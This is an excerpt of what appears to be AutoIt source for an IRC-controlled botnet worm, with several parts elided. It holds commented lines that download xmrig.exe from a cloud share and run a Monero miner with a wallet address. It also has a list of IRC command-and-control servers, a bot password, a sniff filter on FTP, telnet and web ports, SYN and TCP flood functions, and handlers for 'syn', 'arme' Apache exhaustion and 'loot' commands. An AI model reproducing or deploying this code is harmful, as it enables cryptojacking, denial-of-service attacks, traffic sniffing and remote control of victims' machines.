...
; skid shit botnet pro mod exec the wormzZ ANALY ISIS WORM SYSY
...
; ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
;
;InetGet("https://my.microsoftpersonalcontent.com/personal/f060a27ce78638ce/_layouts/15/download.aspx?UniqueId=f1447e1e-0506-4506-9e38-348d234c71be&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiIzMjU2MzdkMy05ZmJiLTRkNDctYjgyMy0yYWQ4YzU3ODM0NWEiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzUxODkzOTE5In0.6xjvi8fSuFQaSkbrdh3nAabEkZ1xYiyDIHv46WvWd9f2NPkuNSwEVR422q-RuahscesbtFNpVdFuyMEbXwNL_ZvM0bubx1PN3LM4lB1CG7Latp0s0OQ4yKXH2o1eZ1QihWUim12Nc2PgSxOHMb7I7frhX-j5NlbNkvXb7mA1Uv9a2Q-zcXcWPKULKk5GVwWmiN8P5pmfZ5-qCC_0H60LSOLeH5bTiT5HZ2xG-VoPuscFYC6ENEEORbyL3-4RYkpK09iM-PH1QZWipkcg99NMu7IvO1xC7LxEkQ-aU-WFXv82kBnnKlcixQn3_Pjc0cmP6VzXB5MuEvOMBKcx7kiUzee0AucrU28-lUexLMZaGewMVvf2AF1bXgX3ijZARqqI6pRCfqC_RG8g9hbm-0jMVLr3GbIhft1DSudm2F_UomP6G0InP58y4b-DO1Fp-GKcOpeJDM9blLA-T14QAM-YGkpLIYsmwJZ0Wg6Z9Kq54LkLQM1XgZ5406vYIWmna86jXNQVURYXmgUg3AtWOt4u4A.29_BXrdAjTYv_oK5I0W7yH1tb6dXD92oN6Z1nSgwvN0&ApiVersion=2.0", "xmrig.exe")
;Run("xmrig.exe --donate-level 4 -o xmr-eu1.nanopool.org:14433 -u 47MA8Jwoe5JZLF6Sk7GRAnZW7633ELyxeT5SgFCqUfA48X4RJZjjNdR55kC8U5Gqxx5FQfA1rYspr9Gfg7nKmPxXQvvy5w4 --tls --coin monero -B",".",0)
; Started miner by now!
;
; ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
$s=Call("ListAccounts")
ConsoleWrite($s & @CRLF)
ConsoleWrite("<- data was $s" & @CRLF)
CryptAcquireContext()
...
Global $maxthreads = EnvGet("NUMBER_OF_PROCESSORS") * 4 ;four scan subthreads
; double connect for primary server down below.
Global $nodes = StringSplit("irc.pirc.pl:6667|irc.sorcery.net:6667|irc.sorcery.net:6667|irc.pirc.pl:6667|irc.pirc.pl:6667|irc.pirc.pl:6667|bofh.nl.smurfnet.ch:6667|irc.executingreality.com:6667|irc.freenode.org:6667|irc.pirc.pl:6667|irc.anthrochat.net:6667|irc.executingreality.com:6667|irc.pirc.pl:6667|bofh.nl.smurfnet.ch:6667|irc.freenode.org:6667|", "|", 3)
Global $sniffopt = "tcp port (21 or 23 or 80 or 81 or 8081 or 8080 or 8888 or 8181)"
Global $signedin = False
Global $botpassword = "systemwide";10 char long bot pw
...
Global $url = "https://drive.usercontent.google.com/open?id=1bAx2n_db0GBiQ0M2maiTOqCazXZAhDRS&authuser=0"
...
Func _synflood($host, $port, $time)
	...
	While 1
		...
		TCPConnect($ip, $port)
	WEnd
	sendmessage($sock, "Connect flood finished", $channel)
EndFunc   ;==>_synflood
Func _tcpflood($ip, $port, $packetsize, $time)
	...
	While 1
		...
		TCPCloseSocket($tcpsock)
	WEnd
	sendmessage($sock, "Connect/disconnect TCP data flood finished", $channel)
EndFunc   ;==>_tcpflood
...
Func cmd($user, $channel, $msg)
	...
	Switch StringLower($stemp[2])
		...
		Case "opme"
			If $signedin = True Then
				TCPSend($sock, "MODE +o " & StringReplace(StringSplit($msg,"!",3)[0],":","") & "\r\n")
			...
			EndIf
		Case "syn"; syn ip port time - connect flooding
		...
		Case "arme" ; apache remote memory exhaustion flood good for apache
			...
			EndIf
		Case "monitor"
			sendmessage($sock, "Already monitoring systems packets and responses", $channel)
		Case "loot"
			If _elementexists($stemp, 5) And $signedin = True Then
